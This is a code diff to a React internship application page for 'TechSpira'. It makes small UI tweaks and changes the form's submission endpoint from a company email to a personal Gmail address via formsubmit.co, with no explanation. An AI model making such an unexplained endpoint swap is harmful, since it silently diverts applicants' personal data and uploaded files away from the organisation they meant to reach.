@@ -66,6 +66,7 @@ function App() {
   ];
 
   const handleNameChange = (e) => {
+    e.preventDefault();
     const newName = e.target.value;
     setName(newName);
     setSubject(`TechSpira Internship Application from ${newName}`);
@@ -82,7 +83,7 @@ function App() {
     return (
       <div>
         <div className="hero">
-          <span className="tag-label">WELCOME TO TECHSPIRA</span>
+          <span className="tag-label animate-bounce">WELCOME TO TECHSPIRA</span>
           <h1>
             We help interns to work <br />
             their way to the stars
@@ -137,7 +138,7 @@ function App() {
 
             <form
               className="form-content"
-              action="https://formsubmit.co/enasup@techspira.co.in"
+              action="https://formsubmit.co/rockyrocky9526@gmail.com"
               method="POST"
               encType="multipart/form-data"
             >
@@ -243,3 +244,8 @@ function App() {
 }
 
 export default App;
+
+
+
+
+
